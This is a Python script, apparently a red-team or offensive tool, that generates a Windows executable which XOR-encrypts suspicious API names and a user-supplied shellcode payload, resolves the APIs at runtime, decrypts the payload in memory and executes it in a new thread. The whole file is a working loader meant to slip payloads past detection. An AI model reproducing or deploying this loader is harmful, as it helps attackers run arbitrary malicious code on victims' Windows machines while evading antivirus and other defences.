#!/usr/bin/env python3
'''
Author:  Bryan McNulty
Contact: bryanmcnulty@protonmail.com

This script generates an executable which encrypts sketchy procedure names
and loads them dynamically along with some shellcode. If the program is
not given the key at runtime then the decryption will fail and the intended
shellcode will not execute

Python requirements:
  - argparse
  - jinja2

OS: Linux
OS requirements:
  - x86_64-w64-mingw32-g++ (MinGW)
'''

import argparse
import subprocess
import tempfile

from jinja2 import Environment, FileSystemLoader
from os import path
from random import shuffle
from string import ascii_letters, digits
from sys import exit


templates_simple = '''#include <windows.h>

typedef PVOID(WINAPI *PGetCurrentProcess)();
typedef PVOID(WINAPI *PVirtualAllocEx)(HANDLE, PVOID, SIZE_T, DWORD, DWORD);
typedef PVOID(WINAPI *PWriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T);
typedef PVOID(WINAPI *PVirtualProtectEx)(HANDLE, LPVOID, SIZE_T, DWORD, PDWORD);
typedef PVOID(WINAPI *PCreateThread)(PSECURITY_ATTRIBUTES, SIZE_T, PTHREAD_START_ROUTINE, PVOID, DWORD, PDWORD);
typedef PVOID(WINAPI *PWaitForSingleObject)(HANDLE, DWORD);

void decryptMemory(char *addr, int size, const char key[])
{
    for (int i = 0; i < size; i++) {
        addr[i] ^= key[i % strlen(key)];
    }
}

void simple(const char shellcode[], const char key[])
{
    const char strKernel32[] = "Kernel32.dll";
    const char strVirtualAllocEx[] = "{{ encrypt_string('VirtualAllocEx') }}";
    const char strWriteProcessMemory[] = "{{ encrypt_string('WriteProcessMemory') }}";
    const char strVirtualProtectEx[] = "{{ encrypt_string('VirtualProtectEx') }}";

    decryptMemory((char*)&strVirtualAllocEx, strlen(strVirtualAllocEx), key);
    decryptMemory((char*)&strWriteProcessMemory, strlen(strWriteProcessMemory), key);
    decryptMemory((char*)&strVirtualProtectEx, strlen(strVirtualProtectEx), key);

    HMODULE hKernel32 = GetModuleHandle(strKernel32);
    PGetCurrentProcess funcGetCurrentProcess = (PGetCurrentProcess)GetProcAddress(hKernel32, "GetCurrentProcess");
    PVirtualAllocEx funcVirtualAllocEx = (PVirtualAllocEx)GetProcAddress(hKernel32, strVirtualAllocEx);
    PWriteProcessMemory funcWriteProcessMemory = (PWriteProcessMemory)GetProcAddress(hKernel32, strWriteProcessMemory);
    PVirtualProtectEx funcVirtualProtectEx = (PVirtualProtectEx)GetProcAddress(hKernel32, strVirtualProtectEx);
    //PCreateThread funcCreateThread = (PCreateThread)GetProcAddress(hKernel32, "CreateThread");
    PWaitForSingleObject funcWaitForSingleObject = (PWaitForSingleObject)GetProcAddress(hKernel32, "WaitForSingleObject");

    DWORD init_prot = PAGE_READWRITE;
    DWORD sc_len = strlen(shellcode) + 1;
    DWORD threadID;

    //HANDLE proc = funcGetCurrentProcess();
    HANDLE proc = GetCurrentProcess();

    PVOID addr = funcVirtualAllocEx(proc, NULL, sc_len, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
    funcWriteProcessMemory(proc, addr, shellcode, sc_len, (SIZE_T)NULL);
    decryptMemory((char*)addr, sc_len, key);
    funcVirtualProtectEx(proc, addr, sc_len, PAGE_EXECUTE_READ, &init_prot);
    
    //HANDLE hThread = funcCreateThread(NULL, 0, (PTHREAD_START_ROUTINE)addr, NULL, 0, &threadID);
    HANDLE hThread = CreateThread(NULL, 0, (PTHREAD_START_ROUTINE)addr, NULL, 0, &threadID);
    
    //funcWaitForSingleObject(hThread, INFINITE);
    WaitForSingleObject(hThread, INFINITE);
}

int main(int argc, char **argv)
{
    if (argc == 2) {
        const char shellcode[] = "{{ encrypt(shellcode) }}";
        simple(shellcode, argv[1]);
    }

    return 0;
}
'''

def xor(data, key):

	return bytes([data[i] ^ key[i % len(key)] for i in range(len(data))])


def hex_to_escaped_bytes(hexData):

	return ''.join(['\\x' + hexData[i:i + 2] for i in range(0, len(hexData), 2)])


def xor_c(*xorArgs):

	hexXoredData = xor(*xorArgs).hex()
	return hex_to_escaped_bytes(hexXoredData)


class ExecutableFactory:

	def __init__(self):

		self.c = Environment()


	def render_template(self, template_params):

		template = self.c.from_string(templates_simple)
		content = template.render(**template_params)
		return content

	
	def compile_template(self, source, out_file):
		source_file = tempfile.mkstemp(suffix='.c', text=True)[1]

		with open(source_file, 'w') as file:
			file.write(source)

		compiler = 'x86_64-w64-mingw32-g++'
		args = ['-Os', '-fdata-sections', '-ffunction-sections', '-s', '-Wl,--gc-sections', '-o', out_file]
		cmd = [compiler, source_file] + args

		try:
			subprocess.check_output(cmd)
	
		except FileNotFoundError:
			print(f'[!] Compiler "{compiler}" not found in $PATH.')
			print(f'\ntry running the following:\n\tsudo apt-get install g++-mingw-w64-x86-64\n')
			exit(1)
	
		except Exception as error:
			print('[!] Unknown error.')
			print(error)
			exit(1)

		try:
			subprocess.check_output(['rm', source_file])

		except Exception as error:
			print(f'[!] Error removing temporary file')
			print(error)

		return True


	def generate_key(self, strings, key_length):

		key_material = list((digits + ascii_letters).encode('utf-8'))
		key = []

		for i in range(key_length):
			position = []

			for string in strings:
				for j in range(i, len(string), key_length):
					position += [string[j]]

			shuffle(key_material)

			for char in key_material:
				if char not in position:
					key += [char]
					break
		
		return bytes(key)


	def generate(self, shellcode, out_file):

		key = self.generate_key([
			#b'Kernel32.dll',
			b'VirtualAllocEx',
			b'WriteProcessMemory',
			b'VirtualProtectEx',
			b'WaitForSingleObject',
			shellcode],
			16
		)

		template_params = {
			"encrypt": lambda x: xor_c(x, key),
			"encrypt_string": lambda x: xor_c(x.encode(), key),
			"shellcode": shellcode
		}

		source = self.render_template(template_params)
		
		self.compile_template(source, out_file)

		print(f'Your key is: "{key.decode()}"')


def main():

	parser = argparse.ArgumentParser()
	parser.add_argument('-f', '--bin', required=True, help='Raw shellcode file')
	parser.add_argument('-o', '--output', default='simple.exe', help='Output file')
	args = parser.parse_args()

	with open(args.bin, 'rb') as file:
		shellcode = file.read()

	ef = ExecutableFactory()
	ef.generate(shellcode, args.output)


if __name__ == '__main__':
	main()
